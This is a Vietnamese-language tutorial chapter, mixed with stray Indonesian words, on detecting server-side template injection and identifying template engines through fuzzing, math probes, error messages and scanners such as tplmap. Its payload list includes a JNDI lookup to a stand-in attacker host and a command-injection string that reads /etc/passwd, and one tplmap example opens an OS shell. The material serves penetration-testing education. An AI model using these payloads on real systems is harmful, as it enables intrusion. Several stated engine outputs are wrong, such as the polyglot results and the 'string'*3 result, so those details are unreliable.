# 03 - Phát Hiện và Xác Định Template Engine

## Phương Pháp Phát Hiện SSTI

### Fuzzing - Phương Pháp Ban Đầu

Fuzzing là kỹ thuật đơn giản nhất để phát hiện SSTI. Inject một chuỗi ký tự đặc biệt thường được sử dụng trong template syntax:

```
Special character string: ${{<%[%'"}}%\
```

Nếu response khác với input thường, có thể có SSTI:

**Ví dụ:**

```
Input: username=normal
Response: Hello normal

Input: username=${{<%[%'"}}%\
Response: Error / khác biệt đáng kể
```

**Các ký tự fuzzing:**

- `${ }` (Mako, Velocity, SpEL)
- `{{ }}` (Jinja2, Twig, Handlebars)
- `<% %>` (ERB, EJS, JSP)
- `[% %]` (Liquid, Perl Template)
- `#{ }` (Ruby, Haml)
- `{# #}` (Twig comment)

### Plaintext Context Detection

**Kỹ thuật:** Inject toán học đơn giản và kiểm tra đánh giá

```
Payload: {{7*7}}
Expected Output: 49
```

**Test Cases:**

| Payload                 | Template Engine | Output |
| ----------------------- | --------------- | ------ |
| `{{7*7}}`               | Jinja2          | `49`   |
| `${7*7}`                | Mako/Velocity   | `49`   |
| `<%= 7*7 %>`            | ERB             | `49`   |
| `{%7*7%}`               | Smarty          | `49`   |
| `<#assign x=7*7 />${x}` | FreeMarker      | `49`   |

**Cách kiểm tra:**

1. Identify user input field
2. Submit payload toán học
3. Kiểm tra response có chứa result không
4. Nếu có → SSTI detected

### Code Context Detection

Khó hơn vì không thể trực tiếp inject biểu thức. Cần break out khỏi biểu thức hiện tại.

**Bước 1: Establish baseline**

```
Input: greeting=username
Response: Hello username
```

**Bước 2: Inject HTML tag**

```
Input: greeting=username<script>
Response: Hello username  (hoặc Hello, script được strip)
```

**Bước 3: Break out template statement**

```
Input: greeting=username}}<script>
Response: Hello username<script>  ← Chứng tỏ break out thành công!
```

**Bước 4: Inject template expression**

```
Input: greeting=username}}{{7*7}}{{username
Response: Hello username49username
```

### Polyglot Payloads

Sử dụng payload duy nhất có thể trigger lỗi trên nhiều template engine:

```
${7*'7'}         # String + number concatenation
```

**Kết quả theo engine:**

- Jinja2: `49` (7 được nhân 7 lần)
- Twig: `49` (tương tự)
- Velocity: `7777777` (string repeat)
- Mako: `49`

Kết quả khác nhau giúp identify engine.

## Xác Định Template Engine

### Decision Tree Method

Theo thứ tự thử các biểu thức để loại trừ:

```
1. Test: {{ 7*7 }}
   ✓ → Jinja2, Twig, Django, Handlebars, Mustache
   ✗ → Go to step 2

2. Test: ${ 7*7 }
   ✓ → Mako, Velocity, SpEL, OGNL
   ✗ → Go to step 3

3. Test: <% 7*7 %>
   ✓ → ERB, EJS, JSP, ASP
   ✗ → Go to step 4

4. Test: {% 7*7 %}
   ✓ → Liquid, Perl, ...
   ✗ → Unknown engine

5. Distinguish between {{ }} engines:
   Test: {{ 'string'*3 }}
   Result:
   - "stringstringstringstring" → Jinja2
   - "error" → Twig
   - "stringstringstringstring" → Django
```

### Error Message Analysis

Cách tốt nhất là trigger lỗi và phân tích error message:

```
Payload: {{undefined_var}}
```

**Error messages theo engine:**

| Engine     | Error Message                                                   |
| ---------- | --------------------------------------------------------------- |
| Jinja2     | `UndefinedError: 'undefined_var' is undefined`                  |
| Twig       | `Variable "undefined_var" does not exist`                       |
| Mako       | `NameError: Undefined variable: 'undefined_var'`                |
| ERB        | `NameError: undefined local variable or method 'undefined_var'` |
| FreeMarker | `Expression ... has no .undefined_var property`                 |
| Velocity   | `Undefined variable: $undefined_var`                            |

Error message thường chứa tên template engine, version, hoặc file path.

### Object/Variable Enumeration

Một khi có SSTI, liệt kê các object có sẵn:

**Jinja2:**

```jinja2
{{ self }}           # Template object
{{ cycler }}         # Built-in function
{{ range }}          # Built-in function
{{ config }}         # Flask config (if available)
{{ request }}        # Flask request object
```

**Output example:**

```
<jinja2.runtime.LoopContext object at ...>
```

**Mako:**

```mako
${pageContext}       # Request object
${request}           # Request object
```

**ERB:**

```erb
<%= binding %>       # Variable binding
<%= self %>          # Current scope
```

### Version Detection

Sekali template engine diidentifikasi, tentukan version:

**Jinja2:**

```jinja2
{{ self.__class__.__init__.__globals__['jinja2'].__version__ }}
```

**Mako:**

```mako
<% import mako; print(mako.__version__) %>
```

## Detection Techniques Summary

### Rendered Technique

```
Input: {{7*7}}
Output contains: 49
→ SSTI Detected!
```

Cocok khi:

- Output render langsung ke response
- Tidak ada sanitization
- Template syntax tidak di-escape

### Error-Based Technique

```
Input: {{undefined_var%}
Output: Error message revealing engine
→ SSTI + Engine Detected!
```

Cocok khi:

- Error messages verbose
- Web app returns detailed error
- Output tidak filter error

### Boolean-Based Technique

```
Input: {{7*7==49?'1':'0'}}
Response: '1' → SSTI detected (tanpa explicit output)
```

Cocok khi:

- Output di-filter/tidak visible
- Bisa observe perbedaan dalam response
- Conditional logic berfungsi

### Time-Based Technique

```
Input: {{7*7==49 and sleep(5)}}
Response delay: 5 seconds
→ SSTI detected (blind)
```

Cocok khi:

- Response tidak menunjukkan hasil
- Bisa observe response time
- Sleep/delay functions tersedia

## Payload Detection List

### Chuỗi Tes Universal (Dari OWASP)

```
a{{bar}}b
a{{7*7}}
{var}
${var}
{{var}}
<%var%>
[%var%]
{{=var=}}
${jndi:ldap://attacker.com/a}
${IFS}cat${IFS}/etc/passwd
<%= 7*7 %>
#{ 7*7 }
{#7*7#}
{{7*7}}
<%= %>
{{}}
${7*7}
{% %}
[% %}
```

### Testing Dalam Praktice

**Step 1: Identify Input Fields**

- Check URL parameters
- Analyze POST body
- Inspect headers
- Test file uploads

**Step 2: Template Syntax Fuzzing**
Untuk mỗi input field:

```
1. Payload: ${{<%[%'"}}%\
2. Check response khác với normal
3. Nếu ada perubahan → SSTI possible
```

**Step 3: Math Payload Testing**
Thay fuzzing string dengan:

```
- {{7*7}}
- ${ 7*7 }
- <% 7*7 %>
- [% 7*7 %]
- Dll sesuai template syntax list
```

**Step 4: Engine Identification**

- Gunakan decision tree
- Analyze error messages
- Enumerate available objects
- Confirm dengan multiple payloads

**Step 5: Confirmation**

```jinja2
{{config}}  atau
{{self}}    atau
{{request}}
```

Jika memiliki output/error menunjukkan engine details → Confirmed SSTI

## Automation Tools

### Tplmap

```bash
# Basic scan
python3 tplmap.py -u 'http://target.com/page?name=SSTI*'

# With shell
python3 tplmap.py -u 'http://target.com/page?name=SSTI*' --os-shell

# Specify engine
python3 tplmap.py -u 'http://target.com/page?name=SSTI*' -e jinja2
```

### TInjA (Template Injection Scanner)

```bash
tinja url -u "http://example.com/?name=Kirlia"
```

### SSTImap

```bash
python3 sstimap.py -u 'https://example.com/page?name=John'
```

## Tài Liệu Liên Quan

- [02-vulnerability-analysis.md](02-vulnerability-analysis.md) - Phân tích lỗ hổng
- [04-exploitation-techniques.md](04-exploitation-techniques.md) - Kỹ thuật khai thác
